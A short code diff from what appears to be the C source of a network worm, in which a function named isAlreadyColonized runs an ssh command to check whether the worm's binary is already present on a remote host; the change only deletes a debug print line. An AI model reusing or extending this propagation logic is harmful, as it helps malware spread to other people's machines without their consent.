@@ -204,7 +204,6 @@ bool isAlreadyColonized(char *host, char *programName, char *ssh, int portSSH, c
 	strcat(programPath, programName);
 	sprintf(command, "%s -p %d %s \"test -f %s\"", ssh, portSSH, host, programPath);
 	free(programPath);
-	printf("command : %s\n", command);
 	// test if the worm is present on the remote host
 	if (system(command) == 0)
 		ret = true;
